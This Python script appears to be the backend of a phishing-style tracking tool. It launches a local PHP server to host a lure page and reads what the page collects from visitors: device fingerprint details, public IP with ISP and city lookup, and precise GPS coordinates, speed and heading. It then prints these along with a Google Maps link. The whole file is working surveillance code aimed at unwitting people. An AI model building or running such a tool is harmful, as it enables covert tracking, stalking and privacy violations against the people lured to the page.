#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import time
import json
import requests
import subprocess as subp
row = []
info = 'php/info.txt'
result = 'php/result.txt'
def server():
	print('starting php', end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:8080'], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:8080/index.html')
		php_sc = php_rqst.status_code
	except requests.ConnectionError:
		print('failed')
		Quit()
def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('waiting')
			printed = True
		if size > 0:
			main()
def main():
	global info, result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:
				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']
				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)
				print('device information : ')
				print('os         : ' + var_os)
				print('platform   : ' + var_platform)
				print('cpu cores  : ' +  var_cores)
				print('ram        : ' +  var_ram)
				print('gpu vendor : ' +  var_vendor)
				print('gpu        : ' +  var_render)
				print('resolution : ' +  var_res)
				print('browser    : ' +  var_browser)
				print('public ip  : ' +  var_ip)
				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code
				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])
					row.append(var_continent)
					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)
					print('continent  : ' + var_continent)
					print('country    : ' +  var_country)
					print('region     : ' +  var_region)
					print('city       : ' +  var_city)
					print('org        : ' +  var_org)
					print('isp        : ' +  var_isp)
	except ValueError:
		pass
	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'
				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'not available'
				else:
					var_alt == value['alt'] + ' m'
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'not available'
				else:
					var_dir = value['dir'] + ' deg'
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'not available'
				else:
					var_spd = value['spd'] + ' m/s'
				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)
				print ('location Information : ' )
				print ('latitude  : ' +  var_lat)
				print ('longitude : ' +  var_lon)
				print ('accuracy  : ' +  var_acc)
				print ('altitude  : ' +  var_alt)
				print ('direction : ' +  var_dir)
				print ('speed     : ' +  var_spd)
	except ValueError:
		error = file
		print (error)
		repeat()
	print ('google maps: ' + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	repeat()
def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass
def repeat():
	clear()
	wait()
	main()
def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()
try:
	server()
	wait()
	main()
except KeyboardInterrupt:
	Quit()
